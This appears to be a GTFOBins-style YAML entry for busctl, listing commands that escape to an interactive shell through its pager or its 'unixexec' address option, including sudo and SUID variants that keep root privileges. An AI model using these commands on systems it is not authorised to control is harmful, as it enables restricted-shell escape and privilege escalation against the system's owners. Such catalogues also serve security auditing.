---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        busctl --show-machine
        !/bin/sh
    - code: |
        busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
  sudo:
    - code: |
        sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
  suid:
    - code: |
        ./busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
---
